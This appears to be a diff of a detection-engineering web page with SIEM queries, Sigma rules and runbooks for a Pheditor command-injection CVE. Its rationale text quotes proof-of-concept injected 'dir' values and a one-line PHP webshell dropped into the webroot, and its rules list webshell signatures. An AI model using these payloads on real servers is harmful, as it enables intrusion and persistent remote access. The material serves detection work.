+Rationale: Article PoC Step 4 shows `dir=/tmp; curl -s https://ifconfig.me #` — the literal `;` (URL-encoded %3B) inside the dir POST parameter is the injection signature. The hex-encoded variants cover URL encoding by curl/browsers.
 
 Cross-checked against:
-  • https://github.com/advisories/GHSA-jvc5-6g7q-c843
-  • https://owasp.org/www-community/attacks/Command_Injection
-  • https://cwe.mitre.org/data/definitions/78.html</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate admin pasting a directory path containing a space-then-semicolon (rare; benign)</li><li>Pen-test or vulnerability-scanner traffic (Nessus, Qualys, Burp scanner) probing the endpoint</li><li>Browser auto-filled previous-session &#x27;dir&#x27; values containing $ or backtick if used inside the path</li><li>Encoded-but-benign characters introduced by client-side JS that URL-encodes the path twice</li><li>Internal QA / staging environments where developers test terminal commands intentionally</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (csUserAgent has_any (&quot;Nessus&quot;,&quot;Qualys&quot;,&quot;Tenable&quot;,&quot;Burp&quot;,&quot;Acunetix&quot;,&quot;InternalSecScan&quot;) and cIP startswith &quot;10.&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage — extract the source IP, the exact decoded &#x27;dir&#x27; payload, and whether the response was 200 vs blocked; pivot on the same SrcIp across all pheditor.php hits in the last 24h to spot enumeration. 2) Contain — block source IP at WAF / edge; rotate the pheditor admin password (article shows default &#x27;admin&#x27;); if Pheditor 2.0.1–2.0.3, immediately disable the terminal permission in config or take pheditor.php offline pending patch. 3) Hunt — correlate to the companion UC for php→sh spawning on the same host within ±60s, search DeviceFileEvents for new .php files under /var/www, and check DeviceNetworkEvents for outbound to attacker IPs (ifconfig.me, attacker-controlled curl targets).</div></details>
+  • https://github.com/advisories/GHSA-jvc5-6g7q-c843</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate Pheditor users typing paths with embedded pipes (extremely rare for dir field)</li><li>Penetration testers running Burp/sqlmap against the app with authorization</li><li>Internal vuln scanners (Tenable, Qualys) firing CVE-2026-48030 plugins</li><li>WAF security tests / blue-team red-team exercises</li><li>Application logs replaying historical request bodies for analytics</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (csUserAgent has_any (&quot;Tenable&quot;,&quot;Qualys&quot;,&quot;Nessus&quot;,&quot;sqlmap&quot;,&quot;Nuclei&quot;) and cIP in (&quot;10.scanner.ip.1&quot;,&quot;10.scanner.ip.2&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Decode the dir parameter; confirm the injected payload (curl/wget/python? PHP webshell write?). Capture the source IP, session cookie, and User-Agent. Cross-reference the IP against threat intel and your own authentication logs to identify the authenticated user whose creds were used.
+Step 2 (Contain): WAF-block the source IP. Force password reset on the Pheditor account whose session was used. If a webshell write was attempted, inventory webroot for new .php files (see UC #3). Patch Pheditor to &gt;= 2.0.4 immediately.
+Step 3 (Hunt): Search all web logs for any other POST to pheditor.php in the prior 90 days with dir parameter containing metacharacters — this advisory&#x27;s PoC is public so opportunistic scanning is likely. Identify any other authenticated sessions originating from the same IP / UA across other applications.</div></details>
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-100-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn active" data-target="art-100-uc1-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-100-uc1-sentinel">Sentinel KQL</button>
       <button class="tab-btn" data-target="art-100-uc1-sigma">Sigma</button>
       <button class="tab-btn" data-target="art-100-uc1-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-100-uc1-falcon">Falcon LogScale</button>
       <button class="tab-btn" data-target="art-100-uc1-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-100-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>union isfuzzy=true
-  (W3CIISLog
-    | where TimeGenerated &gt; ago(7d)
-    | where csUriStem endswith &quot;pheditor.php&quot;
-    | where csMethod =~ &quot;POST&quot;
-    | where csUriQuery has_any (&quot;%3B&quot;,&quot;%7C&quot;,&quot;%26%26&quot;,&quot;%24%28&quot;,&quot;%60&quot;,&quot;%0A&quot;)
-        or csUriStem has_any (&quot;;&quot;,&quot;|&quot;,&quot;&amp;&amp;&quot;,&quot;$(&quot;,&quot;`&quot;)
-    | project TimeGenerated, Computer, sSiteName, csMethod, csUriStem, csUriQuery, ClientIP=cIP, csUserAgent, csUserName, scStatus),
-  (CommonSecurityLog
-    | where TimeGenerated &gt; ago(7d)
-    | where RequestURL has &quot;pheditor.php&quot;
-    | where RequestMethod =~ &quot;POST&quot;
-    | where Message has_any (&quot;action=terminal&quot;,&quot;dir=&quot;)
-    | where Message has_any (&quot;;&quot;,&quot;|&quot;,&quot;&amp;&amp;&quot;,&quot;$(&quot;,&quot;`&quot;,&quot;%3B&quot;,&quot;%7C&quot;,&quot;%26%26&quot;,&quot;%24%28&quot;,&quot;%60&quot;,&quot;%0A&quot;)
-        or RequestContext has_any (&quot;;&quot;,&quot;|&quot;,&quot;&amp;&amp;&quot;,&quot;$(&quot;,&quot;`&quot;)
-    | project TimeGenerated, DeviceVendor, DeviceProduct, RequestMethod, RequestURL, ClientIP=SourceIP, RequestClientApplication, Message, RequestContext),
-  (ImWebSession
-    | where TimeGenerated &gt; ago(7d)
-    | where Url has &quot;pheditor.php&quot;
-    | where HttpMethod =~ &quot;POST&quot;
-    | where Url has_any (&quot;action=terminal&quot;,&quot;%3B&quot;,&quot;%7C&quot;,&quot;%26%26&quot;,&quot;%24%28&quot;,&quot;%60&quot;)
-    | project TimeGenerated, DvcHostname, HttpMethod, Url, ClientIP=SrcIpAddr, SrcUsername, HttpRequestHeaderUserAgent, HttpStatusCode)
+    <div class="tab-content active" id="art-100-uc1-kql"><pre><button class="copy-btn">COPY</button><code>// Defender XDR rarely sees raw HTTP POST bodies; rely on Linux web access logs forwarded via AMA where present, or fallback to MDE network telemetry as a pivot.
+DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where RemotePort in (80, 443, 8080, 8443)
+| where InitiatingProcessFileName in~ (&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;php-fpm&quot;)
+| join kind=inner (
+    DeviceProcessEvents
+    | where Timestamp &gt; ago(7d)
+    | where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
+    | where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;)
+    | where ProcessCommandLine has_any (&quot;;&quot;,&quot;|&quot;,&quot;`&quot;,&quot;$(&quot;,&quot;&amp;&amp;&quot;)
+  ) on DeviceId
+| where abs(datetime_diff(&#x27;second&#x27;, Timestamp, Timestamp1)) &lt; 5
+| project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessFileName, ChildShell=FileName1, ChildCmd=ProcessCommandLine1
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-100-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>W3CIISLog
+| where TimeGenerated &gt; ago(7d)
+| where csMethod == &quot;POST&quot;
+| where csUriStem endswith &quot;pheditor.php&quot;
+| extend body = tostring(csUriQuery)
+| where body has &quot;action=terminal&quot;
+| where body matches regex @&quot;(?i)dir=[^&amp;]*(%3B|%7C|%60|%24%28|%26%26|;|\||`|\$\(|&amp;&amp;)&quot;
+| project TimeGenerated, Computer, cIP, csUserAgent, csUriStem, body, scStatus
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: POST to pheditor.php with Shell Metacharacters (CVE-2026-48030)
-id: 4a2c5e87-1f6b-4d29-b3a7-9e4c8b5d6f1a
-description: HTTP POST to pheditor.php carrying action=terminal plus shell metacharacters in the request URI / body — direct exploitation of the unsanitized &#x27;dir&#x27; parameter described in CVE-2026-48030.
+    <div class="tab-content" id="art-100-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: HTTP POST to Pheditor.php with Shell Metacharacters in dir Parameter
+id: 8a3c2f1d-7b4e-4d6a-9c2f-1e5b8d3a7c42
+description: Detects POST requests to pheditor.php carrying action=terminal where the dir parameter contains shell metacharacters — the exploitation pattern for CVE-2026-48030.
 references:
   - https://github.com/advisories/GHSA-jvc5-6g7q-c843
-author: Detection Engineering
-date: 2026/06/12
+author: SOC Detection Engineering
+date: 2026/06/16
 tags:
   - attack.t1190
-  - attack.t1059.004
   - attack.initial_access
+  - cve.2026.48030
 logsource:
   category: webserver
 detection:
-  selection_target:
-    cs-uri-stem|endswith: &#x27;/pheditor.php&#x27;
+  selection_method:
     cs-method: &#x27;POST&#x27;
-  selection_action:
-    cs-uri-query|contains:
-      - &#x27;action=terminal&#x27;
-      - &#x27;action%3Dterminal&#x27;
-  selection_metachar:
-    cs-uri-query|contains:
-      - &#x27;%3B&#x27;
-      - &#x27;%7C&#x27;
-      - &#x27;%26%26&#x27;
-      - &#x27;%24%28&#x27;
-      - &#x27;%60&#x27;
-      - &#x27;%0A&#x27;
-      - &#x27;;&#x27;
-      - &#x27;$(&#x27;
-      - &#x27;`&#x27;
-  condition: selection_target and selection_action and selection_metachar
+  selection_uri:
+    cs-uri-stem|endswith: &#x27;pheditor.php&#x27;
+  selection_body:
+    cs-uri-query|contains: &#x27;action=terminal&#x27;
+  selection_meta:
+    cs-uri-query|re|i: &#x27;dir=[^&amp;]*(%3B|%7C|%60|%24%28|;|\||`|\$\()&#x27;
+  condition: selection_method and selection_uri and selection_body and selection_meta
 level: high</code></pre></div>
-    <div class="tab-content" id="art-100-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>@http.method:POST @http.url:*pheditor.php* (@http.url:*action=terminal* OR @http.url:*action%3Dterminal*) (@http.url:*%3B* OR @http.url:*%7C* OR @http.url:*%26%26* OR @http.url:*%24%28* OR @http.url:*%60* OR @http.url:*%0A*)</code></pre></div>
-    <div class="tab-content" id="art-100-uc1-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url=&quot;*pheditor.php*&quot; Web.http_method=&quot;POST&quot; by Web.src Web.dest Web.user Web.url Web.http_user_agent Web.status | `drop_dm_object_name(Web)` | search (url=&quot;*action=terminal*&quot; OR url=&quot;*action%3Dterminal*&quot;) | search (url=&quot;*%3B*&quot; OR url=&quot;*%7C*&quot; OR url=&quot;*%26%26*&quot; OR url=&quot;*%24%28*&quot; OR url=&quot;*%60*&quot; OR url=&quot;*%0A*&quot; OR url=&quot;*%3E%3E*&quot;) | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-100-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url=&quot;*pheditor.php*&quot; Web.http_method=&quot;POST&quot; by Web.src Web.dest Web.user Web.url Web.http_user_agent Web.status | `drop_dm_object_name(Web)` | search (url=&quot;*action=terminal*&quot; OR url=&quot;*action%3Dterminal*&quot;) | search (url=&quot;*%3B*&quot; OR url=&quot;*%7C*&quot; OR url=&quot;*%26%26*&quot; OR url=&quot;*%24%28*&quot; OR url=&quot;*%60*&quot; OR url=&quot;*%0A*&quot; OR url=&quot;*%3E%3E*&quot;) | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+    <div class="tab-content" id="art-100-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>(source:nginx.access OR source:apache.access OR source:iis) @http.method:POST @http.url_details.path:*pheditor.php* (@http.request.body:*action=terminal* AND (@http.request.body:*dir=*%3B* OR @http.request.body:*dir=*%7C* OR @http.request.body:*dir=*%60* OR @http.request.body:*dir=*%24%28* OR @http.request.body:*dir=*\;* OR @http.request.body:*dir=*\|*))</code></pre></div>
+    <div class="tab-content" id="art-100-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>// Falcon FDR ships minimal web-access telemetry by default; this hunts the immediate execution side-effect of the POST.
+#event_simpleName=ProcessRollup2 ParentBaseFileName=/(php-fpm|php|apache2|httpd|nginx)$/i
+| ImageFileName=/(sh|bash|dash)$/i
+| regex(&quot;cd\\s+[^;&amp;|`$]*[;&amp;|`$]&quot;, field=CommandLine)
+| groupBy([aid, ComputerName, UserName, CommandLine], function=count())</code></pre></div>
+    <div class="tab-content" id="art-100-uc1-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where Web.http_method=&quot;POST&quot; Web.url=&quot;*pheditor.php*&quot; by Web.src, Web.dest, Web.url, Web.http_user_agent, Web.status, Web.http_content_length | `drop_dm_object_name(Web)` | join type=inner src,dest [search index=* sourcetype IN (&quot;access_combined&quot;,&quot;nginx:plus:access&quot;,&quot;ms:iis:default&quot;) uri_path=&quot;*pheditor.php*&quot; method=POST | rex field=_raw &quot;(?i)action=terminal&quot; | rex field=_raw &quot;(?i)dir=(?&lt;dir_value&gt;[^&amp;\&quot;]+)&quot; | where match(dir_value,&quot;(%3B|%7C|%60|%24%28|;|\||`|\$\()&quot;) | table src dest dir_value uri] | `security_content_ctime(firstTime)`</code></pre><pre class="spl-mode-body" id="art-100-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where Web.http_method=&quot;POST&quot; Web.url=&quot;*pheditor.php*&quot; by Web.src, Web.dest, Web.url, Web.http_user_agent, Web.status, Web.http_content_length | `drop_dm_object_name(Web)` | join type=inner src,dest [search index=* sourcetype IN (&quot;access_combined&quot;,&quot;nginx:plus:access&quot;,&quot;ms:iis:default&quot;) uri_path=&quot;*pheditor.php*&quot; method=POST | rex field=_raw &quot;(?i)action=terminal&quot; | rex field=_raw &quot;(?i)dir=(?&lt;dir_value&gt;[^&amp;\&quot;]+)&quot; | where match(dir_value,&quot;(%3B|%7C|%60|%24%28|;|\||`|\$\()&quot;) | table src dest dir_value uri] | `security_content_ctime(firstTime)`</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="8397fe012c" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+<details class="uc" data-uc-slug="6ba7629549" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
   <summary>
-    <span class="uc-title">Pheditor CVE-2026-48030 — webshell drop: PHP / web account writing .php to webroot</span>
+    <span class="uc-title">PHP worker writing executable webshell to webroot (Pheditor RCE persistence)</span>
     <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="8397fe012c" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="6ba7629549" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects file-creation events where a web service process (php-fpm, apache2, nginx, php-cgi) or its child shell writes a .php file into /var/www, /srv/www or /usr/share/nginx/html under the web service account. Article PoC Step 5 drops `&lt;?php system($_GET[&#x27;c&#x27;]);?&gt;` to /var/www/html/shell.php — this catches the persistence stage of the exploit.
+    <div class="uc-desc">Detects the post-exploitation persistence step from the advisory&#x27;s PoC Step 5: a PHP/Apache/Nginx worker process writing a .php file into the webroot. Pheditor&#x27;s vulnerable dir parameter lets attackers drop `&lt;?php system($_GET[&quot;c&quot;]);?&gt;` into /var/www/html/.
 
-Rationale: Article PoC Step 5: `echo &#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php` — the canonical PHP webshell drop. Process-writes-PHP-into-webroot-as-web-user is the cleanest pivot because legit deploys are done by root / deploy-bot, NOT by www-data; this combination is high-fidelity for any PHP-RCE post-exploit, not just Pheditor. Cross-referenced against MITRE T1505.003 webshell technique and ATT&amp;CK Linux execution case studies.
+Rationale: Article PoC Step 5: `dir=/var/www/html; echo &#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php #` followed by `curl http://TARGET/shell.php?c=id` returning `uid=33(www-data)`. The file-write to webroot by a www-data-owned PHP/shell process is the persistent artifact.
 
 Cross-checked against:
-  • https://github.com/advisories/GHSA-jvc5-6g7q-c843
-  • https://attack.mitre.org/techniques/T1505/003/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Server Software Component: Web Shell">T1505.003</span> <span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span></div>
+  • https://github.com/advisories/GHSA-jvc5-6g7q-c843</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Web Shell">T1505.003</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>CMS auto-update (WordPress core/plugin updates) running as www-data writing .php into webroot</li><li>Composer install run as www-data during in-place deploy populating vendor/*.php</li><li>File-upload features in legitimate apps that store user-supplied .php (rare — usually blocked, but some plugins permit)</li><li>Theme/plugin install workflows in dev / staging environments</li><li>Cache-generation systems that materialise .php views (Symfony cache:warmup, Smarty compiled templates) into webroot-adjacent paths</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessParentFileName in~ (&quot;wp-cron.php&quot;,&quot;composer.phar&quot;,&quot;symfony&quot;) and InitiatingProcessCommandLine has_any (&quot;upgrade&quot;,&quot;cache:warmup&quot;,&quot;composer install&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage — pull SHA256 + first 512 bytes of the dropped file; webshell signatures like `&lt;?php system($_GET`, `eval($_POST`, `passthru($_REQUEST`, `assert(stripslashes(`, base64-only bodies are conclusive. Identify the parent shell command and tie it back to the pheditor.php POST via the companion UCs. 2) Contain — quarantine / delete the file via MDE Live Response (capture a copy for IR first), isolate the host, rotate web-user-readable secrets (DB credentials in .env / wp-config.php), and remove pheditor.php from the webroot until patched. 3) Hunt — fingerprint the webshell hash across all hosts via DeviceFileEvents, search DeviceNetworkEvents for GET requests hitting the dropped filename (shell.php?c=...), and check for additional persistence (cron, systemd timers, .ssh/authorized_keys, /etc/ld.so.preload).</div></details>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Pheditor&#x27;s own file editor saving legitimate .php files (this IS its core feature) — refine by excluding writes that came from Pheditor&#x27;s `action=save` handler</li><li>Composer / Symfony / Laravel cache regeneration writing compiled .php to var/cache</li><li>WordPress / Drupal plugin auto-update writing new .php into wp-content/plugins</li><li>CI/CD deployment scripts running as www-data writing release artifacts</li><li>Pre-production rsync from staging pushing legitimate .php updates</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessCommandLine has_any (&quot;composer&quot;,&quot;artisan cache&quot;,&quot;drush&quot;,&quot;wp-cli&quot;,&quot;wp core update&quot;) or FolderPath has_any (&quot;/var/cache/&quot;,&quot;/wp-content/plugins/.tmp/&quot;,&quot;/sites/default/files/cache/&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Read the newly-written .php contents. Look for backdoor signatures: `system($_GET`, `eval($_POST`, `passthru(`, `base64_decode(` calls, `assert($_REQUEST`. Hash the file and IOC-check. Identify which Pheditor user-session triggered the write (cross-ref web access logs).
+Step 2 (Contain): Quarantine the .php file (`chmod 000` and move to /quarantine/). Block direct HTTP access to it at the WAF. Take a memory snapshot of php-fpm workers before restart. Restart php-fpm to evict any in-memory webshell state. Reset all Pheditor passwords.
+Step 3 (Hunt): Search all DeviceFileEvents/ImFileEvent for .php writes by www-data in the last 90 days — webshells often pre-date discovery by months. Pivot on the SHA256 across the fleet. Check DeviceNetworkEvents for any GET requests TO the newly-discovered shell URL — that&#x27;s the attacker&#x27;s access pattern.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-100-uc2-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-100-uc2-sentinel">Sentinel KQL</button>
@@ -22658,131 +22654,197 @@ Cross-checked against:
     </div>
     <div class="tab-content active" id="art-100-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceFileEvents
 | where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;)
-| where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;)
-| where FolderPath has_any (&quot;/var/www/&quot;,&quot;/srv/www/&quot;,&quot;/usr/share/nginx/html/&quot;,&quot;/srv/http/&quot;)
-| where FileName endswith &quot;.php&quot; or FileName endswith &quot;.phtml&quot; or FileName endswith &quot;.phar&quot;
-| where ActionType in~ (&quot;FileCreated&quot;,&quot;FileModified&quot;,&quot;FileRenamed&quot;)
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath, FileName, SHA256, ActionType
+| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
+| where FileName endswith &quot;.php&quot;
+| where FolderPath has_any (&quot;/var/www/&quot;,&quot;/srv/www/&quot;,&quot;/usr/share/nginx/html&quot;,&quot;/var/lib/nginx&quot;,&quot;/opt/lampp/htdocs&quot;,&quot;/home/&quot;)
+| where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;)
+| where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;)
+| extend SuspiciousName = FileName matches regex @&quot;(?i)^(shell|cmd|c99|r57|wso|b374k|backdoor|tmp|upload|test|x|0|hax|pwn|cnf)\.php$&quot;
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath, SuspiciousName, SHA256
 | order by Timestamp desc</code></pre></div>
     <div class="tab-content" id="art-100-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImFileEvent
 | where TimeGenerated &gt; ago(7d)
-| where ActingProcessName has_any (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;)
-| where ActorUsername in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;)
-| where TargetFilePath has_any (&quot;/var/www/&quot;,&quot;/srv/www/&quot;,&quot;/usr/share/nginx/html/&quot;,&quot;/srv/http/&quot;)
-| where TargetFileName endswith &quot;.php&quot; or TargetFileName endswith &quot;.phtml&quot; or TargetFileName endswith &quot;.phar&quot;
-   or TargetFileExtension in~ (&quot;php&quot;,&quot;phtml&quot;,&quot;phar&quot;)
-| where EventType in~ (&quot;FileCreated&quot;,&quot;FileModified&quot;,&quot;FileRenamed&quot;)
-| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256, EventType
+| where EventType == &quot;FileCreated&quot;
+| where TargetFileName endswith &quot;.php&quot;
+| where TargetFilePath has_any (&quot;/var/www/&quot;,&quot;/srv/www/&quot;,&quot;/usr/share/nginx/html&quot;,&quot;/var/lib/nginx&quot;,&quot;/opt/lampp/htdocs&quot;)
+| where ActingProcessName has_any (&quot;php-fpm&quot;,&quot;php&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;)
+| where ActorUsername in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;)
+| extend SuspiciousName = TargetFileName matches regex @&quot;(?i)^(shell|cmd|c99|r57|wso|b374k|backdoor|tmp|upload|test|x|0)\.php$&quot;
+| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFileName, TargetFilePath, SuspiciousName
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Web Service Account Writing PHP File to Webroot (Webshell Drop)
-id: c8d9f034-3e7b-4a5c-9d8e-2f6a1c7b9d4e
-description: Web server PHP processes (or shells they spawn) creating .php / .phtml / .phar files inside /var/www, /srv/www or /usr/share/nginx/html under a web service account — the article&#x27;s PoC drops /var/www/html/shell.php exactly this way (CVE-2026-48030).
+    <div class="tab-content" id="art-100-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: PHP Worker Writing Webshell to Webroot (Pheditor CVE-2026-48030 Persistence)
+id: 6c4d8f2a-3e1b-4f7a-8c5d-2a9b6e4c1f73
+description: Detects creation of .php files in webroot by PHP-FPM/Apache/Nginx worker processes running under web-server accounts — the persistence step from the Pheditor CVE-2026-48030 PoC.
 references:
   - https://github.com/advisories/GHSA-jvc5-6g7q-c843
-author: Detection Engineering
-date: 2026/06/12
+author: SOC Detection Engineering
+date: 2026/06/16
 tags:
   - attack.t1505.003
   - attack.persistence
+  - cve.2026.48030
 logsource:
   category: file_event
   product: linux
 detection:
+  selection_file:
+    TargetFilename|endswith: &#x27;.php&#x27;
+    TargetFilename|contains:
+      - &#x27;/var/www/&#x27;
+      - &#x27;/srv/www/&#x27;
+      - &#x27;/usr/share/nginx/html&#x27;
+      - &#x27;/var/lib/nginx&#x27;
   selection_proc:
     Image|endswith:
       - &#x27;/php-fpm&#x27;
       - &#x27;/php&#x27;
-      - &#x27;/php-cgi&#x27;
       - &#x27;/apache2&#x27;
       - &#x27;/httpd&#x27;
       - &#x27;/nginx&#x27;
       - &#x27;/sh&#x27;
       - &#x27;/bash&#x27;
-      - &#x27;/dash&#x27;
   selection_user:
     User:
       - &#x27;www-data&#x27;
       - &#x27;apache&#x27;
       - &#x27;nginx&#x27;
       - &#x27;nobody&#x27;
-      - &#x27;httpd&#x27;
-      - &#x27;_www&#x27;
-  selection_path:
-    TargetFilename|contains:
-      - &#x27;/var/www/&#x27;
-      - &#x27;/srv/www/&#x27;
-      - &#x27;/usr/share/nginx/html/&#x27;
-      - &#x27;/srv/http/&#x27;
-  selection_ext:
-    TargetFilename|endswith:
-      - &#x27;.php&#x27;
-      - &#x27;.phtml&#x27;
-      - &#x27;.phar&#x27;
-  condition: selection_proc and selection_user and selection_path and selection_ext
+  condition: selection_file and selection_proc and selection_user
 level: high</code></pre></div>
